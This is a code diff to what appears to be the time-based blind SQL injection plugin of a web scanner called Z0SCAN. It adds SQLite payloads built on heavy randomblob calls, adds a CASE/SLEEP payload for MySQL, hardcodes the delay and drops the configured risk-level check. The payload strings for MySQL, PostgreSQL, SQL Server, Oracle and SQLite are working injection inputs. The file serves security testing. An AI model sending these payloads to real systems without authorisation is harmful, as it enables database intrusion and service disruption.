@@ -14,7 +14,7 @@ class Z0SCAN(PluginBase):
     version = "2025.7.29"
     risk = 2
     
-    sleep_time = conf.sqli_time
+    sleep_time = 5
     sleep_str = "[SLEEP_TIME]"
     verify_count = 2
 
@@ -27,7 +27,8 @@ class Z0SCAN(PluginBase):
             "MySQL": 0.9,
             "Postgresql": 0.85,
             "Microsoft SQL Server or Sybase": 0.8,
-            "Oracle": 0.75
+            "Oracle": 0.75,
+            "SQLite": 0.8
         }
 
     def calculate_time_probability(self, dbms_type, actual_delay, expected_delay):
@@ -64,7 +65,7 @@ class Z0SCAN(PluginBase):
         return payload1, payload0
     
     def audit(self):
-        if self.fingerprints.waf or not self.risk in conf.risk or conf.level == 0:
+        if self.fingerprints.waf or conf.level == 0:
             return
         num = random_num(4)
         sql_times = {
@@ -74,7 +75,9 @@ class Z0SCAN(PluginBase):
                 "' AND SLEEP({})".format(self.sleep_str),
                 "' AND SLEEP({})--+".format(self.sleep_str),
                 "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, num, num),
-                '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num)),
+                # '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num),
+                ',(CASE WHEN ({}={}) THEN (SELECT SLEEP({})) ELSE id END)'.format(num, num, self.sleep_str),
+            ), 
             "Postgresql": (
                 "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, self.sleep_str),
                 "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, self.sleep_str),
@@ -82,14 +85,23 @@ class Z0SCAN(PluginBase):
             "Microsoft SQL Server or Sybase": (
                 " waitfor delay '0:0:{}'--+".format(self.sleep_str),
                 "' waitfor delay '0:0:{}'--+".format(self.sleep_str),
-                '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str)),
+                # '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str),
+            ), 
             "Oracle": (
                 " and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
                 "' and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+".format(self.sleep_str),
-                '''"  and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+'''.format(self.sleep_str),
+                # '''"  and 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {})--+'''.format(self.sleep_str),
                 "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sleep_str),
                 "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(self.sleep_str),
-            )
+            ), 
+            "SQLite": (
+                " AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
+                " AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)--+".format(num, num),
+                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
+                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)--+".format(num, num),
+                "' AND 1=(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END) AND '{}'='{}'".format(num, num, num, num),
+                ",(CASE WHEN ({}={}) THEN randomblob(1000000000) ELSE 0 END)".format(num, num),
+            ),
         }
         iterdatas = self.generateItemdatas()
     
